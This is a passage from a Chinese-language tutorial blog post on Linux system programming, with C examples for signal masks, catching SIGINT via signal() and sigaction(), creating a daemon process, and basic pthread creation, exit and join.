class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">sigset_t</span> <span class="built_in">set</span>,oldset,pedset;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">sigemptyset(&amp;<span class="built_in">set</span>);</span><br><span class="line">sigaddset(&amp;<span class="built_in">set</span>,SIGINT);</span><br><span class="line"></span><br><span class="line">ret = sigprocmask(SIG_BLOCK,&amp;<span class="built_in">set</span>,&amp;oldset);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sigprocmask error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ret = sigpending(&amp;pedset);</span><br><span class="line">print_set(&amp;pedset);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="信号捕捉"><a href="#信号捕捉" class="headerlink" title="信号捕捉"></a>信号捕捉</h4><h5 id="signal函数"><a href="#signal函数" class="headerlink" title="signal函数"></a>signal函数</h5><p>注册一个信号捕捉函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*<span class="keyword">sighandler_t</span>)</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">sighandler_t</span> <span class="title">signal</span><span class="params">(<span class="keyword">int</span> signum,<span class="keyword">sighandler_t</span> handler)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="使用signal函数捕捉SIGINT信号"><a href="#使用signal函数捕捉SIGINT信号" class="headerlink" title="使用signal函数捕捉SIGINT信号"></a>使用signal函数捕捉SIGINT信号</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sig_catch</span><span class="params">(<span class="keyword">int</span> signo)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"catch you!! %d\n"</span>,signo);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">signal(SIGINT,sig_catch);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="sigaction函数"><a href="#sigaction函数" class="headerlink" title="sigaction函数"></a>sigaction函数</h5><p>修改信号处理动作(通常在Linux用其来注册一个信号的捕捉函数)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigaction</span><span class="params">(<span class="keyword">int</span> signum,<span class="keyword">const</span> struct sigaction *act,struct sigaction *oldact)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">成功：0</span><br><span class="line">失败：<span class="number">-1</span> 设置errno</span><br><span class="line">  </span><br><span class="line">参数</span><br><span class="line">  act: 传入参数，新的处理方式</span><br><span class="line">  oldact: 传出参数，旧的处理方式</span><br></pre></td></tr></table></figure><p>struct sigaction 结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> &#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*sa_handler)(<span class="keyword">int</span>); <span class="comment">//指定信号捕捉后的处理函数名</span></span><br><span class="line">  <span class="keyword">void</span> (*sa_sigaction)(<span class="keyword">int</span>,<span class="keyword">siginfo_t</span>*,<span class="keyword">void</span>*);</span><br><span class="line">  <span class="keyword">sigset_t</span> samask; <span class="comment">//调用信号处理函数时，所要屏蔽的信号集合</span></span><br><span class="line">  <span class="keyword">int</span> sa_flags; <span class="comment">//通常设置为0 表示默认属性</span></span><br><span class="line">  <span class="keyword">void</span> (*sa_restorer)(<span class="keyword">void</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用sigaction函数捕捉SIGINT信号"><a href="#使用sigaction函数捕捉SIGINT信号" class="headerlink" title="使用sigaction函数捕捉SIGINT信号"></a>使用sigaction函数捕捉SIGINT信号</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sig_catch</span><span class="params">(<span class="keyword">int</span> signo)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"catch you!! %d\n"</span>,signo);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">act</span>,<span class="title">oldact</span>;</span></span><br><span class="line">act.sa_handler = sig_catch; <span class="comment">//set callback function name</span></span><br><span class="line">sigemptyset(&amp;(act.sa_mask)); <span class="comment">//set mask when sig_catch working</span></span><br><span class="line">act.sa_flags = <span class="number">0</span>; <span class="comment">//usually use</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret = sigaction(SIGINT,&amp;act,&amp;oldact); <span class="comment">//注册信号捕捉函数</span></span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sigaction error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h4><p>Daemon是Linux中的后台服务进程，通常独立于控制终端并且周期性地执行某种任务或等待处理某些发生的时间，一般采用以d结尾的名字。Linux后台的一些系统服务进程，没有控制终端，不能直接和用户交互，不受用户登陆、注销的影响，一直在运行着，他们都是守护进程。如，预读入缓输出机制的实现，FTP服务器，nfs服务器等。创建守护进程，最关键的一步是调用setsid函数创建一个新的Session，并成为Session Leader</p><h5 id="创建守护进程模型"><a href="#创建守护进程模型" class="headerlink" title="创建守护进程模型"></a>创建守护进程模型</h5><ul><li><p>创建子进程，父进程推出</p><p>所有工作在子进程中进行形式上脱离了控制终端</p></li><li><p>在子进程中创建新会话</p><p><code>setsid()</code>函数</p><p>使子进程完全独立出来，脱离控制</p></li><li><p>改变当前目录为根目录</p><p><code>chdir()</code>函数</p><p>防止占用可卸载的文件系统(U盘等)</p><p>也可以换成其他路径</p></li><li><p>重设文件权限掩码</p><p><code>umask()</code>函数</p><p>防止继承的文件创建屏蔽字拒绝某些权限</p><p>增加守护进程灵活性</p></li><li><p>关闭文件描述符(0,1,2)</p><p>继承的打开文件不会用到，浪费系统资源，无法卸载</p></li></ul><h5 id="创建守护进程代码"><a href="#创建守护进程代码" class="headerlink" title="创建守护进程代码"></a>创建守护进程代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">int</span> ret,fd;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid&gt;<span class="number">0</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">//父进程终止</span></span><br><span class="line"></span><br><span class="line">pid = setsid();  <span class="comment">//创建新会话</span></span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"setsid error"</span>);</span><br><span class="line">ret = chdir(<span class="string">"/Users/caoyifan/Desktop/test"</span>); <span class="comment">//改变工作目录位置</span></span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"chdir error"</span>);</span><br><span class="line">umask(<span class="number">0022</span>); <span class="comment">//改变文件访问权限掩码</span></span><br><span class="line">close(STDIN_FILENO); <span class="comment">//关闭文件描述符0</span></span><br><span class="line">fd = open(<span class="string">"/dev/null"</span>,O_RDWR); <span class="comment">// fd=0</span></span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line">dup2(fd,STDOUT_FILENO); <span class="comment">//重定向stdout和stderr</span></span><br><span class="line">dup2(fd,STDERR_FILENO);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">//模拟守护进程业务</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><h5 id="线程概念"><a href="#线程概念" class="headerlink" title="线程概念"></a>线程概念</h5><p>LWP：light weight process 轻量级的进程，本质仍是进程（Linux环境下）</p><p>进程：独立地址空间，拥有PCB</p><p>线程：有独立的PCB，但没有独立的地址空间</p><p>区别：在于是否共享地址空间</p><p>Linux下</p><ul><li>线程：最小的执行单位</li><li>进程：最小分配资源单位，可看程师只有一个线程的进程</li></ul><h5 id="线程共享资源"><a href="#线程共享资源" class="headerlink" title="线程共享资源"></a>线程共享资源</h5><ul><li>文件描述符表</li><li>每种信号的处理方式</li><li>当前工作目录</li><li>用户ID和组ID</li><li>内存地址空间(.text/.data/.bss/heap/共享库)</li></ul><h5 id="线程非共享资源"><a href="#线程非共享资源" class="headerlink" title="线程非共享资源"></a>线程非共享资源</h5><ul><li>线程id</li><li>处理器现场和栈指针(内核栈)</li><li>独立的栈空间(用户空间栈)</li><li>errno变量</li><li>信号屏蔽字</li><li>调度优先级</li></ul><h5 id="线程优缺点"><a href="#线程优缺点" class="headerlink" title="线程优缺点"></a>线程优缺点</h5><p>优点：提高程序并发性 ，开销小，数据通信共享数据方便</p><p>缺点：库函数，不稳定，调试编写困难，gdb不支持，对信号支持不好</p><h4 id="线程控制原语"><a href="#线程控制原语" class="headerlink" title="线程控制原语"></a>线程控制原语</h4><h5 id="pthread-self函数"><a href="#pthread-self函数" class="headerlink" title="pthread_self函数"></a>pthread_self函数</h5><p>获取线程ID，其作用对应进程中<code>getpid</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pthread_t</span> <span class="title">pthread_self</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：无</span><br></pre></td></tr></table></figure><h5 id="pthread-create函数"><a href="#pthread-create函数" class="headerlink" title="pthread_create函数"></a>pthread_create函数</h5><p>创建一个新线程，其作用对应进程中fork函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_create</span><span class="params">(<span class="keyword">pthread_t</span> *thread,<span class="keyword">const</span> <span class="keyword">pthread_attr_t</span> *attr,<span class="keyword">void</span>*(*start_routine)(<span class="keyword">void</span> *),<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：错误号</span><br><span class="line">参数</span><br><span class="line">  <span class="keyword">pthread_t</span>：当前Linux中可理解为：<span class="keyword">typedef</span> unsignd <span class="keyword">long</span> <span class="keyword">int</span> <span class="keyword">pthread_t</span></span><br><span class="line">  参数<span class="number">1</span>：传出参数，保存系统为我们分配好的线程ID</span><br><span class="line">  参数<span class="number">2</span>：通常传<span class="literal">NULL</span>，表示使用线程默认属性，若想使用具体属性也可以修改该参数</span><br></pre></td></tr></table></figure><h5 id="创建一个线程"><a href="#创建一个线程" class="headerlink" title="创建一个线程"></a>创建一个线程</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"thread : pid = %d,tid = %lu\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="comment">//tid = pthread_self();</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"main : pid = %d,tid = %lu\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">int</span> ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"pthread_create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="循环创建多个子线程"><a href="#循环创建多个子线程" class="headerlink" title="循环创建多个子线程"></a>循环创建多个子线程</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = (<span class="keyword">int</span>)arg;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--I'm %dth thread: pid = %d,tid = %lu\n"</span>,i+<span class="number">1</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,ret;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,(<span class="keyword">void</span> *)i);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"pthread_create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"main: I'm Main,pid = %d,tid = %lu\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pthread-exit函数"><a href="#pthread-exit函数" class="headerlink" title="pthread_exit函数"></a>pthread_exit函数</h5><p>将单个线程退出</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pthread_exit</span><span class="params">(<span class="keyword">void</span> *retval)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">参数：retval表示线程退出状态，通常传NULL</span><br></pre></td></tr></table></figure><p>举例，使用<code>pthread_exit</code>退出主线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"thread : pid = %d,tid = %ld\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"main : pid = %d,tid = %ld\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">int</span> ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"pthread_create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">pthread_exit((<span class="keyword">void</span>*)<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pthread-join函数"><a href="#pthread-join函数" class="headerlink" title="pthread_join函数"></a>pthread_join函数</h5><p>阻塞等待线程退出，获取线程退出状态，其作用对应进程中的<code>waitpid()</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_join</span><span class="params">(<span class="keyword">pthread_t</span> thread,<span class="keyword">void</span> **retval)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  成功：0</span><br><span class="line">  失败：错误号</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">  thread：线程ID</span><br><span class="line">  retval：存储线程结束状态</span><br></pre></td></tr></table></figure><p>对比记忆</p><ul><li>进程中 <code>main</code>返回值、<code>exit</code>参数—&gt;<code>int</code>；等待子进程结束 <code>wait</code> 函数参数—&gt;<code>int *</code></li><li>线程中 